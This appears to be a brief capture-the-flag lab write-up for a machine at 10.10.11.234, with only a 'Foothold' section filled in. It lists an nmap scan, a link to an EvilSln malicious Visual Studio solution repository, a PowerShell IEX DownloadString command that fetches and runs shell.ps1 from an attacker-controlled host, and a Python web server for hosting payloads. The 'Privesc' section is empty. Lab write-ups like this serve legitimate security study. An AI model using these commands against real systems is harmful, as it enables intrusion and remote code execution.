## Foothold

```sh
nmap -Pn -sC -sV -p- -oA scan 10.10.11.234
```
https://github.com/cjm00n/EvilSln
```powershell
powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.48:80/shell.ps1')
```

```sh
python3 -m http.server 8000
```

```sh
http://10.10.16.48:3000/p4v1c/Visual.git
```

## Privesc : 